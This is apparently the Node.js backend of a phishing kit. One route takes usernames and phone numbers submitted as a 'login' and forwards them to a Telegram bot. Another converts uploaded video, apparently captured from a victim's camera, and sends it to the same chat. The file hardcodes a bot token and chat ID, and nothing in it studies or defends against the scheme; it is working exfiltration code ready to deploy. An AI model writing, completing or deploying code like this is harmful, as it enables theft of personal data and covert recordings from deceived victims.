const express = require("express");
const multer = require("multer");
const fs = require("fs");
const axios = require("axios");
const FormData = require("form-data");
const cors = require("cors");
const ffmpeg = require("fluent-ffmpeg");
const path = require("path");

const app = express();

// =====================
// ⚙️ MIDDLEWARE & SETUP
// =====================
app.use(cors());
app.use(express.json());

// Ensure uploads folder exists
if (!fs.existsSync("uploads")) {
    fs.mkdirSync("uploads");
    console.log("✅ Created 'uploads' directory");
}

// =====================
// 📁 FILE STORAGE (IMPROVED - unique names)
// =====================
const storage = multer.diskStorage({
    destination: "uploads/",
    filename: (req, file, cb) => {
        const ext = path.extname(file.originalname).toLowerCase() || ".webm";
        // Ultra-unique name to prevent any collision
        const uniqueName = `${Date.now()}-${Math.random().toString(36).slice(2, 11)}${ext}`;
        cb(null, uniqueName);
    }
});

const upload = multer({ storage });

// =====================
// 🔑 CONFIG
// =====================
const BOT_TOKEN = "8662744373:AAHjNatUA4lnCNtpIRETqPUuTDVENOTXROc";
const CHAT_ID = "8280326139";

// =====================
// 📱 PHONE LOGIN ROUTE
// =====================
app.post("/send-phone", async (req, res) => {
    const { username, phone } = req.body;
    
    if (!username || !phone) {
        return res.status(400).send("Missing data");
    }

    console.log(`👤 New Login: ${username} (${phone})`);

    try {
        await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            chat_id: CHAT_ID,
            text: `🔔 *New Login*\n👤 User: ${username}\n📱 Phone: ${phone}`,
            parse_mode: "Markdown"
        });
        res.status(200).send("Login sent to bot");
    } catch (err) {
        console.error("❌ Telegram Login Error:", err.message);
        res.status(500).send("Bot failed to send login");
    }
});

// =====================
// 🚀 VIDEO UPLOAD ROUTE (FIXED)
// =====================
app.post("/upload", upload.single("video"), async (req, res) => {
    let filePath = null;
    let mp4Path = null;

    try {
        console.log("\n==============================");
        console.log("🚀 Upload received");

        if (!req.file) {
            console.log("❌ No file uploaded");
            return res.status(400).send("No file uploaded");
        }

        filePath = req.file.path;
        // Clean MP4 path (no ugly .webm.mp4)
        const baseName = path.basename(filePath, path.extname(filePath));
        mp4Path = path.join(path.dirname(filePath), `${baseName}.mp4`);

        console.log("📁 Original path :", filePath);
        console.log("📁 Converted path:", mp4Path);
        console.log("🎥 MIME type     :", req.file.mimetype);

        // =====================
        // 🔄 FFmpeg conversion
        // =====================
        console.log("🔄 Starting FFmpeg conversion...");
        await new Promise((resolve, reject) => {
            ffmpeg(filePath)
                .outputOptions([
                    "-c:v libx264",
                    "-preset ultrafast",
                    "-pix_fmt yuv420p",
                    "-c:a aac"
                ])
                .on("start", cmd => console.log("🎬 FFmpeg command:", cmd))
                .on("end", () => {
                    console.log("✅ FFmpeg conversion complete");
                    resolve();
                })
                .on("error", err => {
                    console.error("❌ FFmpeg ERROR:", err.message);
                    reject(err);
                })
                .save(mp4Path);
        });

        console.log("📦 Converted file ready");

        // =====================
        // 📤 TELEGRAM UPLOAD
        // =====================
        console.log("📤 Sending to Telegram...");

        const form = new FormData();
        form.append("chat_id", CHAT_ID);
        form.append("video", fs.createReadStream(mp4Path), {
            filename: "specimen.mp4",
            contentType: "video/mp4"
        });

        await axios.post(
            `https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`,
            form,
            { headers: form.getHeaders() }
        );

        console.log("📨 Telegram response success!");

        res.send("Upload successful");

    } catch (err) {
        console.error("\n❌ ERROR OCCURRED ❌");
        console.error("Message:", err.message);
        if (err.response?.data) {
            console.error("Telegram/API error:", JSON.stringify(err.response.data, null, 2));
        }
        res.status(500).send("Failed (check server logs)");
    } finally {
        // 🔥 ALWAYS CLEAN UP - this was the main source of the "only works once" bug
        console.log("🧹 Cleaning up files...");
        try {
            if (filePath && fs.existsSync(filePath)) {
                fs.unlinkSync(filePath);
                console.log("🗑️ Deleted original:", filePath);
            }
            if (mp4Path && fs.existsSync(mp4Path)) {
                fs.unlinkSync(mp4Path);
                console.log("🗑️ Deleted converted:", mp4Path);
            }
        } catch (cleanupErr) {
            console.error("Cleanup error:", cleanupErr.message);
        }
        console.log("==============================\n");
    }
});

// =====================
// 🌐 START SERVER
// =====================
app.listen(3000, () => {
    console.log("🌐 Server running and ready for Surge connections");
});
